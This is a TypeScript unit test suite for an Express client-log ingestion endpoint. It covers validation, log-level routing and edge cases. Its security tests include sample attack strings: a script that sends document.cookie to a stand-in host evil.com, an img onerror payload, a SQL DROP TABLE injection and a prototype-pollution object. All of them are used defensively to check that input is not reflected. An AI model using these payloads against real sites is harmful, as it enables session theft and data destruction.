/**
 * Unit Tests - Logs Routes
 *
 * Tests for client log ingestion endpoint.
 * Validates log format, batching, and error handling.
 *
 * Endpoint tested:
 * - POST /api/logs - Ingest client-side logs
 *
 * @module __tests__/unit/routes/logs.routes
 */

import { describe, it, expect, vi, beforeEach } from 'vitest';
import request from 'supertest';
import express, { Application } from 'express';
import logsRouter from '@/routes/logs';
import { ErrorCode } from '@/shared/constants/errors';

// ============================================
// Mock Dependencies
// ============================================

// Mock logger with vi.hoisted() + regular functions to survive vi.resetAllMocks()
// mockChildLogger is the innermost child returned by logger.child()
const mockChildLogger = vi.hoisted(() => ({
  debug: vi.fn(),
  info: vi.fn(),
  warn: vi.fn(),
  error: vi.fn(),
  fatal: vi.fn(),
  trace: vi.fn(),
}));

// mockLogger is returned by createChildLogger() and has a child() method
const mockLogger = vi.hoisted(() => {
  const mock = {
    info: vi.fn(),
    warn: vi.fn(),
    error: vi.fn(),
    debug: vi.fn(),
    fatal: vi.fn(),
    trace: vi.fn(),
    child: vi.fn(() => mockChildLogger),  // Returns mockChildLogger for assertions
  };
  return mock;
});

vi.mock('@/shared/utils/logger', () => ({
  logger: mockLogger,
  createChildLogger: () => mockLogger,  // Returns mockLogger which has .child()
}));

// ============================================
// Test Helpers
// ============================================

function createTestApp(): Application {
  const app = express();
  app.use(express.json());
  app.use('/api', logsRouter);
  return app;
}

// ============================================
// Test Suite
// ============================================

describe('Logs Routes', () => {
  let app: Application;

  beforeEach(() => {
    vi.clearAllMocks();
    app = createTestApp();
  });

  // ============================================
  // POST /api/logs - Basic Functionality
  // ============================================
  describe('POST /api/logs', () => {
    it('should accept valid log entries and return 204', async () => {
      // Arrange
      const validLogs = {
        logs: [
          {
            timestamp: '2024-01-15T10:00:00.000Z',
            level: 'info',
            message: 'User clicked button',
            context: { buttonId: 'submit-btn' },
            userAgent: 'Mozilla/5.0',
            url: 'https://app.example.com/chat',
          },
        ],
      };

      // Act
      const response = await request(app)
        .post('/api/logs')
        .send(validLogs)
        .expect(204);

      // Assert
      expect(response.body).toEqual({});
      expect(mockChildLogger.info).toHaveBeenCalled();
    });

    it('should process multiple logs in a batch', async () => {
      // Arrange
      const batchLogs = {
        logs: [
          { timestamp: '2024-01-15T10:00:00Z', level: 'debug', message: 'Debug message 1' },
          { timestamp: '2024-01-15T10:00:01Z', level: 'info', message: 'Info message' },
          { timestamp: '2024-01-15T10:00:02Z', level: 'warn', message: 'Warning message' },
          { timestamp: '2024-01-15T10:00:03Z', level: 'error', message: 'Error message' },
        ],
      };

      // Act
      await request(app)
        .post('/api/logs')
        .send(batchLogs)
        .expect(204);

      // Assert - each log level should be called once
      expect(mockChildLogger.debug).toHaveBeenCalledTimes(1);
      expect(mockChildLogger.info).toHaveBeenCalledTimes(1);
      expect(mockChildLogger.warn).toHaveBeenCalledTimes(1);
      expect(mockChildLogger.error).toHaveBeenCalledTimes(1);
    });

    it('should include client context in server logs', async () => {
      // Arrange
      const logWithContext = {
        logs: [
          {
            timestamp: '2024-01-15T10:00:00Z',
            level: 'error',
            message: 'API request failed',
            context: { endpoint: '/api/users', statusCode: 500 },
            userAgent: 'Mozilla/5.0 Chrome/120',
            url: 'https://app.example.com/settings',
          },
        ],
      };

      // Act
      await request(app)
        .post('/api/logs')
        .send(logWithContext)
        .expect(204);

      // Assert
      expect(mockChildLogger.error).toHaveBeenCalledWith(
        expect.objectContaining({
          endpoint: '/api/users',
          statusCode: 500,
          clientTimestamp: '2024-01-15T10:00:00Z',
          userAgent: 'Mozilla/5.0 Chrome/120',
          clientUrl: 'https://app.example.com/settings',
        }),
        'API request failed'
      );
    });

    it('should handle empty logs array', async () => {
      // Arrange
      const emptyLogs = { logs: [] };

      // Act
      await request(app)
        .post('/api/logs')
        .send(emptyLogs)
        .expect(204);

      // Assert - no logs should be processed
      expect(mockChildLogger.debug).not.toHaveBeenCalled();
      expect(mockChildLogger.info).not.toHaveBeenCalled();
      expect(mockChildLogger.warn).not.toHaveBeenCalled();
      expect(mockChildLogger.error).not.toHaveBeenCalled();
    });
  });

  // ============================================
  // Log Level Handling
  // ============================================
  describe('Log Level Handling', () => {
    it('should route debug logs correctly', async () => {
      // Arrange
      const debugLog = {
        logs: [{ timestamp: '2024-01-15T10:00:00Z', level: 'debug', message: 'Debug info' }],
      };

      // Act
      await request(app).post('/api/logs').send(debugLog).expect(204);

      // Assert
      expect(mockChildLogger.debug).toHaveBeenCalledWith(
        expect.any(Object),
        'Debug info'
      );
    });

    it('should route info logs correctly', async () => {
      // Arrange
      const infoLog = {
        logs: [{ timestamp: '2024-01-15T10:00:00Z', level: 'info', message: 'Info message' }],
      };

      // Act
      await request(app).post('/api/logs').send(infoLog).expect(204);

      // Assert
      expect(mockChildLogger.info).toHaveBeenCalledWith(
        expect.any(Object),
        'Info message'
      );
    });

    it('should route warn logs correctly', async () => {
      // Arrange
      const warnLog = {
        logs: [{ timestamp: '2024-01-15T10:00:00Z', level: 'warn', message: 'Warning!' }],
      };

      // Act
      await request(app).post('/api/logs').send(warnLog).expect(204);

      // Assert
      expect(mockChildLogger.warn).toHaveBeenCalledWith(
        expect.any(Object),
        'Warning!'
      );
    });

    it('should route error logs correctly', async () => {
      // Arrange
      const errorLog = {
        logs: [{ timestamp: '2024-01-15T10:00:00Z', level: 'error', message: 'Error occurred' }],
      };

      // Act
      await request(app).post('/api/logs').send(errorLog).expect(204);

      // Assert
      expect(mockChildLogger.error).toHaveBeenCalledWith(
        expect.any(Object),
        'Error occurred'
      );
    });
  });

  // ============================================
  // Validation Errors
  // ============================================
  describe('Validation Errors', () => {
    it('should return 400 for missing logs field', async () => {
      // Arrange
      const invalidPayload = { notLogs: [] };

      // Act
      const response = await request(app)
        .post('/api/logs')
        .send(invalidPayload)
        .expect(400);

      // Assert - standardized error format
      expect(response.body.error).toBe('Bad Request');
      expect(response.body.message).toBe('Invalid log format');
      expect(response.body.code).toBe(ErrorCode.VALIDATION_ERROR);
    });

    it('should return 400 for invalid level value', async () => {
      // Arrange
      const invalidLevel = {
        logs: [
          { timestamp: '2024-01-15T10:00:00Z', level: 'critical', message: 'Test' },
        ],
      };

      // Act
      const response = await request(app)
        .post('/api/logs')
        .send(invalidLevel)
        .expect(400);

      // Assert - standardized error format
      expect(response.body.error).toBe('Bad Request');
      expect(response.body.code).toBe(ErrorCode.VALIDATION_ERROR);
    });

    it('should return 400 for missing required fields', async () => {
      // Arrange - missing message field
      const missingMessage = {
        logs: [
          { timestamp: '2024-01-15T10:00:00Z', level: 'info' },
        ],
      };

      // Act
      const response = await request(app)
        .post('/api/logs')
        .send(missingMessage)
        .expect(400);

      // Assert - standardized error format
      expect(response.body.error).toBe('Bad Request');
      expect(response.body.code).toBe(ErrorCode.VALIDATION_ERROR);
    });

    it('should return 400 for missing timestamp', async () => {
      // Arrange
      const missingTimestamp = {
        logs: [
          { level: 'info', message: 'No timestamp' },
        ],
      };

      // Act
      const response = await request(app)
        .post('/api/logs')
        .send(missingTimestamp)
        .expect(400);

      // Assert - standardized error format
      expect(response.body.error).toBe('Bad Request');
      expect(response.body.code).toBe(ErrorCode.VALIDATION_ERROR);
    });

    it('should return 400 for logs not being an array', async () => {
      // Arrange
      const notArray = {
        logs: { timestamp: '2024-01-15T10:00:00Z', level: 'info', message: 'Test' },
      };

      // Act
      const response = await request(app)
        .post('/api/logs')
        .send(notArray)
        .expect(400);

      // Assert - standardized error format
      expect(response.body.error).toBe('Bad Request');
      expect(response.body.code).toBe(ErrorCode.VALIDATION_ERROR);
    });

    it('should return 400 for invalid JSON', async () => {
      // Act
      const response = await request(app)
        .post('/api/logs')
        .set('Content-Type', 'application/json')
        .send('{ invalid json }')
        .expect(400);

      // Assert - Express JSON parser error
      expect(response.status).toBe(400);
    });
  });

  // ============================================
  // Optional Fields
  // ============================================
  describe('Optional Fields', () => {
    it('should accept logs without context', async () => {
      // Arrange
      const noContext = {
        logs: [
          { timestamp: '2024-01-15T10:00:00Z', level: 'info', message: 'Simple log' },
        ],
      };

      // Act
      await request(app)
        .post('/api/logs')
        .send(noContext)
        .expect(204);

      // Assert
      expect(mockChildLogger.info).toHaveBeenCalled();
    });

    it('should accept logs without userAgent', async () => {
      // Arrange
      const noUserAgent = {
        logs: [
          { timestamp: '2024-01-15T10:00:00Z', level: 'info', message: 'No UA', context: {} },
        ],
      };

      // Act
      await request(app)
        .post('/api/logs')
        .send(noUserAgent)
        .expect(204);

      // Assert
      expect(mockChildLogger.info).toHaveBeenCalled();
    });

    it('should accept logs without url', async () => {
      // Arrange
      const noUrl = {
        logs: [
          { timestamp: '2024-01-15T10:00:00Z', level: 'warn', message: 'No URL' },
        ],
      };

      // Act
      await request(app)
        .post('/api/logs')
        .send(noUrl)
        .expect(204);

      // Assert
      expect(mockChildLogger.warn).toHaveBeenCalled();
    });
  });

  // ============================================
  // Edge Cases
  // ============================================
  describe('Edge Cases', () => {
    it('should handle very long messages', async () => {
      // Arrange
      const longMessage = 'A'.repeat(10000);
      const longLog = {
        logs: [
          { timestamp: '2024-01-15T10:00:00Z', level: 'info', message: longMessage },
        ],
      };

      // Act
      await request(app)
        .post('/api/logs')
        .send(longLog)
        .expect(204);

      // Assert
      expect(mockChildLogger.info).toHaveBeenCalledWith(
        expect.any(Object),
        longMessage
      );
    });

    it('should handle logs with complex context objects', async () => {
      // Arrange
      const complexContext = {
        logs: [
          {
            timestamp: '2024-01-15T10:00:00Z',
            level: 'error',
            message: 'Complex error',
            context: {
              error: {
                message: 'Network error',
                stack: 'Error: Network error\n    at fetch...',
              },
              request: {
                method: 'POST',
                url: '/api/data',
                headers: { 'Content-Type': 'application/json' },
              },
              nested: { deep: { value: 123 } },
            },
          },
        ],
      };

      // Act
      await request(app)
        .post('/api/logs')
        .send(complexContext)
        .expect(204);

      // Assert
      expect(mockChildLogger.error).toHaveBeenCalledWith(
        expect.objectContaining({
          error: expect.objectContaining({ message: 'Network error' }),
          nested: expect.objectContaining({ deep: { value: 123 } }),
        }),
        'Complex error'
      );
    });

    it('should handle large batch of logs', async () => {
      // Arrange - 100 logs
      const largeBatch = {
        logs: Array.from({ length: 100 }, (_, i) => ({
          timestamp: new Date(Date.now() + i * 1000).toISOString(),
          level: 'info' as const,
          message: `Log entry ${i}`,
        })),
      };

      // Act
      await request(app)
        .post('/api/logs')
        .send(largeBatch)
        .expect(204);

      // Assert
      expect(mockChildLogger.info).toHaveBeenCalledTimes(100);
    });

    it('should handle special characters in message', async () => {
      // Arrange
      const specialChars = {
        logs: [
          {
            timestamp: '2024-01-15T10:00:00Z',
            level: 'warn',
            message: 'Special: <script>alert("xss")</script> & "quotes" \'single\'',
          },
        ],
      };

      // Act
      await request(app)
        .post('/api/logs')
        .send(specialChars)
        .expect(204);

      // Assert - should not crash or sanitize (backend logging)
      expect(mockChildLogger.warn).toHaveBeenCalledWith(
        expect.any(Object),
        'Special: <script>alert("xss")</script> & "quotes" \'single\''
      );
    });

    it('should handle unicode characters', async () => {
      // Arrange
      const unicodeLog = {
        logs: [
          {
            timestamp: '2024-01-15T10:00:00Z',
            level: 'info',
            message: '日本語 العربية 中文 emoji: 🎉👍',
          },
        ],
      };

      // Act
      await request(app)
        .post('/api/logs')
        .send(unicodeLog)
        .expect(204);

      // Assert
      expect(mockChildLogger.info).toHaveBeenCalledWith(
        expect.any(Object),
        '日本語 العربية 中文 emoji: 🎉👍'
      );
    });

    it('should handle empty string message', async () => {
      // Arrange
      const emptyMessage = {
        logs: [
          { timestamp: '2024-01-15T10:00:00Z', level: 'debug', message: '' },
        ],
      };

      // Act
      await request(app)
        .post('/api/logs')
        .send(emptyMessage)
        .expect(204);

      // Assert
      expect(mockChildLogger.debug).toHaveBeenCalledWith(
        expect.any(Object),
        ''
      );
    });
  });

  // ============================================
  // Security Considerations
  // ============================================
  describe('Security Considerations', () => {
    it('should not expose server internals on error', async () => {
      // Arrange
      const invalidPayload = null;

      // Act
      const response = await request(app)
        .post('/api/logs')
        .send(invalidPayload)
        .expect(400);

      // Assert - error message should not expose stack traces
      expect(JSON.stringify(response.body)).not.toContain('node_modules');
      expect(JSON.stringify(response.body)).not.toContain('at Object');
    });

    it('should sanitize context for PII (validation only, not filtering)', async () => {
      // Note: The logs route does NOT sanitize PII - it logs as-is
      // This test documents the current behavior
      // PII filtering should be done client-side
      const logWithPII = {
        logs: [
          {
            timestamp: '2024-01-15T10:00:00Z',
            level: 'info',
            message: 'User action',
            context: {
              email: 'user@example.com',
              password: 'secret123', // Client should NOT send this
            },
          },
        ],
      };

      // Act
      await request(app)
        .post('/api/logs')
        .send(logWithPII)
        .expect(204);

      // Assert - context is passed through (client responsibility to filter)
      expect(mockChildLogger.info).toHaveBeenCalledWith(
        expect.objectContaining({
          email: 'user@example.com',
        }),
        'User action'
      );
    });

    it('should NOT include client logs in response body (prevents XSS reflection)', async () => {
      // Arrange - XSS payload in log message
      const xssPayload = {
        logs: [
          {
            timestamp: '2024-01-15T10:00:00Z',
            level: 'error',
            message: '<script>document.location="http://evil.com/steal?c="+document.cookie</script>',
            context: {
              payload: '<img src=x onerror=alert(1)>',
            },
          },
        ],
      };

      // Act
      const response = await request(app)
        .post('/api/logs')
        .send(xssPayload)
        .expect(204);

      // Assert - response body should be empty (204 No Content)
      expect(response.text).toBe('');
      expect(response.body).toEqual({});
    });

    it('should NOT reflect client data in validation error responses', async () => {
      // Arrange - Malicious data in invalid payload
      const maliciousPayload = {
        logs: [
          {
            timestamp: '2024-01-15T10:00:00Z',
            level: 'invalid-level', // Invalid level to trigger validation error
            message: '<script>alert("XSS")</script>',
          },
        ],
      };

      // Act
      const response = await request(app)
        .post('/api/logs')
        .send(maliciousPayload)
        .expect(400);

      // Assert - error response should not include the malicious message
      const responseText = JSON.stringify(response.body);
      expect(responseText).not.toContain('<script>');
      expect(responseText).not.toContain('alert("XSS")');
    });
  });

  // ============================================
  // Input Sanitization Edge Cases
  // ============================================
  describe('Input Sanitization Edge Cases', () => {
    it('should handle null byte injection in message', async () => {
      // Arrange
      const nullByteLog = {
        logs: [
          {
            timestamp: '2024-01-15T10:00:00Z',
            level: 'info',
            message: 'Before\x00After', // Null byte
          },
        ],
      };

      // Act
      await request(app)
        .post('/api/logs')
        .send(nullByteLog)
        .expect(204);

      // Assert - should process without error
      expect(mockChildLogger.info).toHaveBeenCalled();
    });

    it('should handle control characters in message', async () => {
      // Arrange
      const controlCharsLog = {
        logs: [
          {
            timestamp: '2024-01-15T10:00:00Z',
            level: 'warn',
            message: 'Line1\r\nLine2\tTabbed\bBackspace',
          },
        ],
      };

      // Act
      await request(app)
        .post('/api/logs')
        .send(controlCharsLog)
        .expect(204);

      // Assert
      expect(mockChildLogger.warn).toHaveBeenCalled();
    });

    it('should handle timestamp in future (year 2099)', async () => {
      // Arrange
      const futureLog = {
        logs: [
          {
            timestamp: '2099-01-01T00:00:00.000Z',
            level: 'info',
            message: 'Future log',
          },
        ],
      };

      // Act
      await request(app)
        .post('/api/logs')
        .send(futureLog)
        .expect(204);

      // Assert - should accept (validation doesn't check date range)
      expect(mockChildLogger.info).toHaveBeenCalledWith(
        expect.objectContaining({
          clientTimestamp: '2099-01-01T00:00:00.000Z',
        }),
        'Future log'
      );
    });

    it('should handle SQL injection attempts in message', async () => {
      // Arrange
      const sqlInjectionLog = {
        logs: [
          {
            timestamp: '2024-01-15T10:00:00Z',
            level: 'error',
            message: "'; DROP TABLE users; --",
            context: {
              query: "SELECT * FROM users WHERE id = '1' OR '1'='1'",
            },
          },
        ],
      };

      // Act
      await request(app)
        .post('/api/logs')
        .send(sqlInjectionLog)
        .expect(204);

      // Assert - logs are text, SQL injection is not a concern here
      expect(mockChildLogger.error).toHaveBeenCalledWith(
        expect.any(Object),
        "'; DROP TABLE users; --"
      );
    });

    it('should handle prototype pollution attempts in context', async () => {
      // Arrange
      const prototypePollutionLog = {
        logs: [
          {
            timestamp: '2024-01-15T10:00:00Z',
            level: 'info',
            message: 'Prototype test',
            context: {
              '__proto__': { isAdmin: true },
              'constructor': { prototype: { isAdmin: true } },
            },
          },
        ],
      };

      // Act
      await request(app)
        .post('/api/logs')
        .send(prototypePollutionLog)
        .expect(204);

      // Assert - should not affect Object prototype
      expect(({} as Record<string, unknown>).isAdmin).toBeUndefined();
      expect(mockChildLogger.info).toHaveBeenCalled();
    });

    it('should handle extremely long userAgent (>500 chars)', async () => {
      // Arrange
      const longUserAgent = 'Mozilla/5.0 ' + 'x'.repeat(600);
      const longUALog = {
        logs: [
          {
            timestamp: '2024-01-15T10:00:00Z',
            level: 'debug',
            message: 'Long UA test',
            userAgent: longUserAgent,
          },
        ],
      };

      // Act
      await request(app)
        .post('/api/logs')
        .send(longUALog)
        .expect(204);

      // Assert - should accept (no length validation on userAgent)
      expect(mockChildLogger.debug).toHaveBeenCalled();
    });

    it('should handle circular reference in context (via JSON stringify)', async () => {
      // Note: Express JSON body parser handles this - circular refs fail at parse
      // This test verifies that valid deep nesting works
      const deepContext = {
        logs: [
          {
            timestamp: '2024-01-15T10:00:00Z',
            level: 'info',
            message: 'Deep context',
            context: {
              level1: {
                level2: {
                  level3: {
                    level4: {
                      level5: { value: 'deep' },
                    },
                  },
                },
              },
            },
          },
        ],
      };

      // Act
      await request(app)
        .post('/api/logs')
        .send(deepContext)
        .expect(204);

      // Assert
      expect(mockChildLogger.info).toHaveBeenCalled();
    });

    it('should handle logs with only whitespace message', async () => {
      // Arrange
      const whitespaceMessage = {
        logs: [
          {
            timestamp: '2024-01-15T10:00:00Z',
            level: 'info',
            message: '   \t\n   ',
          },
        ],
      };

      // Act
      await request(app)
        .post('/api/logs')
        .send(whitespaceMessage)
        .expect(204);

      // Assert - should accept whitespace-only messages
      expect(mockChildLogger.info).toHaveBeenCalled();
    });
  });

  // ============================================
  // Additional Edge Cases (Phase 3)
  // ============================================
  describe('Additional Edge Cases (Phase 3)', () => {
    describe('Timestamp Edge Cases', () => {
      it('should handle timestamp at Unix epoch (1970-01-01)', async () => {
        // Arrange
        const epochLog = {
          logs: [
            {
              timestamp: '1970-01-01T00:00:00.000Z',
              level: 'info',
              message: 'Epoch timestamp',
            },
          ],
        };

        // Act
        await request(app)
          .post('/api/logs')
          .send(epochLog)
          .expect(204);

        // Assert
        expect(mockChildLogger.info).toHaveBeenCalledWith(
          expect.objectContaining({
            clientTimestamp: '1970-01-01T00:00:00.000Z',
          }),
          'Epoch timestamp'
        );
      });

      it('should handle timestamp with milliseconds precision', async () => {
        // Arrange
        const preciseTimestamp = {
          logs: [
            {
              timestamp: '2024-01-15T10:00:00.123Z',
              level: 'debug',
              message: 'Precise timing',
            },
          ],
        };

        // Act
        await request(app)
          .post('/api/logs')
          .send(preciseTimestamp)
          .expect(204);

        // Assert
        expect(mockChildLogger.debug).toHaveBeenCalled();
      });

      it('should handle timestamp with timezone offset', async () => {
        // Arrange
        const timezoneLog = {
          logs: [
            {
              timestamp: '2024-01-15T15:00:00+05:00',
              level: 'info',
              message: 'Timezone offset',
            },
          ],
        };

        // Act
        await request(app)
          .post('/api/logs')
          .send(timezoneLog)
          .expect(204);

        // Assert
        expect(mockChildLogger.info).toHaveBeenCalled();
      });
    });

    describe('Context Edge Cases', () => {
      it('should handle array values in context', async () => {
        // Arrange
        const arrayContext = {
          logs: [
            {
              timestamp: '2024-01-15T10:00:00Z',
              level: 'info',
              message: 'Array in context',
              context: {
                items: [1, 2, 3, 'four', { five: 5 }],
                tags: ['debug', 'production', 'v2'],
              },
            },
          ],
        };

        // Act
        await request(app)
          .post('/api/logs')
          .send(arrayContext)
          .expect(204);

        // Assert
        expect(mockChildLogger.info).toHaveBeenCalledWith(
          expect.objectContaining({
            items: [1, 2, 3, 'four', { five: 5 }],
          }),
          'Array in context'
        );
      });

      it('should handle boolean values in context', async () => {
        // Arrange
        const booleanContext = {
          logs: [
            {
              timestamp: '2024-01-15T10:00:00Z',
              level: 'info',
              message: 'Boolean context',
              context: {
                isEnabled: true,
                isDisabled: false,
              },
            },
          ],
        };

        // Act
        await request(app)
          .post('/api/logs')
          .send(booleanContext)
          .expect(204);

        // Assert
        expect(mockChildLogger.info).toHaveBeenCalledWith(
          expect.objectContaining({
            isEnabled: true,
            isDisabled: false,
          }),
          'Boolean context'
        );
      });

      it('should handle null values in context', async () => {
        // Arrange
        const nullContext = {
          logs: [
            {
              timestamp: '2024-01-15T10:00:00Z',
              level: 'warn',
              message: 'Null values',
              context: {
                userId: null,
                sessionId: 'valid-session',
                data: null,
              },
            },
          ],
        };

        // Act
        await request(app)
          .post('/api/logs')
          .send(nullContext)
          .expect(204);

        // Assert - context is spread, so sessionId and data are included
        expect(mockChildLogger.warn).toHaveBeenCalledWith(
          expect.objectContaining({
            sessionId: 'valid-session',
            data: null,
          }),
          'Null values'
        );
      });

      it('should handle numeric values in context', async () => {
        // Arrange
        const numericContext = {
          logs: [
            {
              timestamp: '2024-01-15T10:00:00Z',
              level: 'info',
              message: 'Numeric context',
              context: {
                integer: 42,
                float: 3.14159,
                negative: -100,
                zero: 0,
                maxSafe: Number.MAX_SAFE_INTEGER,
              },
            },
          ],
        };

        // Act
        await request(app)
          .post('/api/logs')
          .send(numericContext)
          .expect(204);

        // Assert
        expect(mockChildLogger.info).toHaveBeenCalled();
      });
    });

    describe('URL Edge Cases', () => {
      it('should handle URL with query parameters', async () => {
        // Arrange
        const urlWithQuery = {
          logs: [
            {
              timestamp: '2024-01-15T10:00:00Z',
              level: 'info',
              message: 'Page with params',
              url: 'https://app.example.com/search?q=test&page=2&filter=active',
            },
          ],
        };

        // Act
        await request(app)
          .post('/api/logs')
          .send(urlWithQuery)
          .expect(204);

        // Assert
        expect(mockChildLogger.info).toHaveBeenCalledWith(
          expect.objectContaining({
            clientUrl: 'https://app.example.com/search?q=test&page=2&filter=active',
          }),
          'Page with params'
        );
      });

      it('should handle URL with hash fragment', async () => {
        // Arrange
        const urlWithHash = {
          logs: [
            {
              timestamp: '2024-01-15T10:00:00Z',
              level: 'info',
              message: 'Page with hash',
              url: 'https://app.example.com/docs#section-3',
            },
          ],
        };

        // Act
        await request(app)
          .post('/api/logs')
          .send(urlWithHash)
          .expect(204);

        // Assert
        expect(mockChildLogger.info).toHaveBeenCalled();
      });

      it('should handle localhost URL', async () => {
        // Arrange
        const localhostUrl = {
          logs: [
            {
              timestamp: '2024-01-15T10:00:00Z',
              level: 'debug',
              message: 'Local dev',
              url: 'http://localhost:3000/dev',
            },
          ],
        };

        // Act
        await request(app)
          .post('/api/logs')
          .send(localhostUrl)
          .expect(204);

        // Assert
        expect(mockChildLogger.debug).toHaveBeenCalled();
      });
    });

    describe('UserAgent Edge Cases', () => {
      it('should handle mobile user agent', async () => {
        // Arrange
        const mobileUA = {
          logs: [
            {
              timestamp: '2024-01-15T10:00:00Z',
              level: 'info',
              message: 'Mobile access',
              userAgent: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
            },
          ],
        };

        // Act
        await request(app)
          .post('/api/logs')
          .send(mobileUA)
          .expect(204);

        // Assert
        expect(mockChildLogger.info).toHaveBeenCalled();
      });

      it('should handle bot user agent', async () => {
        // Arrange
        const botUA = {
          logs: [
            {
              timestamp: '2024-01-15T10:00:00Z',
              level: 'info',
              message: 'Bot detected',
              userAgent: 'Googlebot/2.1 (+http://www.google.com/bot.html)',
            },
          ],
        };

        // Act
        await request(app)
          .post('/api/logs')
          .send(botUA)
          .expect(204);

        // Assert
        expect(mockChildLogger.info).toHaveBeenCalled();
      });
    });

    describe('Batch Processing Edge Cases', () => {
      it('should handle batch with mixed valid log levels', async () => {
        // Arrange
        const mixedBatch = {
          logs: [
            { timestamp: '2024-01-15T10:00:00Z', level: 'debug', message: 'Debug 1' },
            { timestamp: '2024-01-15T10:00:01Z', level: 'info', message: 'Info 1' },
            { timestamp: '2024-01-15T10:00:02Z', level: 'debug', message: 'Debug 2' },
            { timestamp: '2024-01-15T10:00:03Z', level: 'warn', message: 'Warn 1' },
            { timestamp: '2024-01-15T10:00:04Z', level: 'error', message: 'Error 1' },
            { timestamp: '2024-01-15T10:00:05Z', level: 'info', message: 'Info 2' },
          ],
        };

        // Act
        await request(app)
          .post('/api/logs')
          .send(mixedBatch)
          .expect(204);

        // Assert
        expect(mockChildLogger.debug).toHaveBeenCalledTimes(2);
        expect(mockChildLogger.info).toHaveBeenCalledTimes(2);
        expect(mockChildLogger.warn).toHaveBeenCalledTimes(1);
        expect(mockChildLogger.error).toHaveBeenCalledTimes(1);
      });

      it('should handle single log entry (minimum batch)', async () => {
        // Arrange
        const singleLog = {
          logs: [
            { timestamp: '2024-01-15T10:00:00Z', level: 'info', message: 'Only one' },
          ],
        };

        // Act
        await request(app)
          .post('/api/logs')
          .send(singleLog)
          .expect(204);

        // Assert
        expect(mockChildLogger.info).toHaveBeenCalledTimes(1);
      });
    });

    describe('Content-Type Edge Cases', () => {
      it('should reject non-JSON content type', async () => {
        // Act
        const response = await request(app)
          .post('/api/logs')
          .set('Content-Type', 'text/plain')
          .send('not json')
          .expect(400);

        // Assert
        expect(response.status).toBe(400);
      });

      it('should accept application/json charset utf-8', async () => {
        // Arrange
        const validLog = {
          logs: [
            { timestamp: '2024-01-15T10:00:00Z', level: 'info', message: 'UTF-8 content' },
          ],
        };

        // Act
        await request(app)
          .post('/api/logs')
          .set('Content-Type', 'application/json; charset=utf-8')
          .send(validLog)
          .expect(204);

        // Assert
        expect(mockChildLogger.info).toHaveBeenCalled();
      });
    });
  });
});
